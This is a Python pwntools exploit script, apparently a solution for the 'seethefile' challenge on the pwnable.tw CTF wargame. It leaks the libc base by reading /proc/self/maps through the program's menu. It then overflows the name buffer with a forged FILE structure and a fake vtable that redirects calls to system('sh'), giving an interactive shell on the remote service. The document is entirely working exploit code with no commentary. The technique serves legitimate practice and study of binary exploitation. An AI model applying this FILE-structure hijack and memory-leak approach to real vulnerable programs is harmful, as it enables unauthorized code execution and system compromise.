#!/usr/bin/python3
from pwn import *

PATH = "./seethefile"
HOST, PORT = "chall.pwnable.tw", 10200
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc.so.6", checksec=False) 
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)


def open(filename):
    sla(b'Your choice :',b'1')
    sla(b'want to see :',filename)

def read():
    sla(b'Your choice :',b'2')

def write_to_screen():
    sla(b'Your choice :',b'3')
def close():
    sla(b'Your choice :',b'4')

def exit(payload):
    sla(b'Your choice :',b'5')
    sla(b'your name :',payload)

gs = '''
b*0x08048AFA
c
'''

p = conn()
GDB()


open("/proc/self/maps")
read()
read()
write_to_screen()

p.recvuntil(b" \n")
libc_leak = int(p.recvuntil(b"-", drop=True), 16)
libc.address = libc_leak
log.warn(hex(libc_leak))

f = FileStructure()
f.flags = u32(b"sh\0\0")
f._lock = exe.bss(800)
f.vtable = exe.sym.name + 0x24 + len(f)
print(f)

vtable = p32(libc.sym.system)*20
payload = b'A'*0x20 + p32(exe.sym.fp + 4) + bytes(f) + vtable

exit(payload)

p.interactive()
